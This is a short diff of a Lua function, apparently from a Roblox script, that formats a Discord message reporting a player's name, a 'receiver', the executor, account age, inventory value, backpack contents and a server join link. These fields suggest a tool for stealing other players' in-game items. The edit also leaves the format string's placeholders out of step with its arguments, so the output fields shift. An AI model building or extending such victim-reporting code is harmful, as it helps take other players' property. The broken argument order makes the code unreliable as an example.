@@ -266,23 +266,20 @@ local function SendJoinMessage(list, prefix)
     -- Build the embed description
     local description = string.format([[
 :bust_in_silhouette: **Player Information**
-Name: %s
+```Name: %s
 Receiver: %s
 Executor: %s
-Account Age: %s days
+Account Age: %s days```
 
 :moneybag: **Total Value**
-%s
+```%s```
 
 :palm_tree: **Backpack**
-%s
-
-:maple_leaf: **Hits**
-%s
+```%s```
 
 :island: **Join with URL**
 %s
-%s | %s
+-# %s | %s
 ]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, hitsStr, joinUrl, placeId, jobId)
 
     local data = {
